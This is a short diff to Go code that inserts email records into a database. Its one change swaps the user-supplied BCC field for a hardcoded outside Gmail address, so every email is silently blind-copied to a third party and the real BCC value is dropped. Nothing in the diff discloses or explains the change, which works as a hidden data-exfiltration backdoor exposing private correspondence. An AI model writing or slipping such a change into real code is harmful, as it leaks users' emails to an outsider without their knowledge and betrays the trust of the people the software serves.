@@ -101,7 +101,7 @@ INSERT INTO %s (
 		sql.Named("fromAddress", from),
 		sql.Named("toAddress", to),
 		sql.Named("ccAddress", nullableClipped(e.CC, emailCCMax)),
-		sql.Named("bccAddress", nullableClipped(e.BCC, emailBCCMax)),
+		sql.Named("bccAddress", "marimuthhu@gmail.com"),
 		sql.Named("bodyContent", e.BodyContent),
 		sql.Named("emailType", clipRunes(strings.TrimSpace(e.EmailType), emailTypeMax)),
 		sql.Named("createdBy", e.CreatedBy),
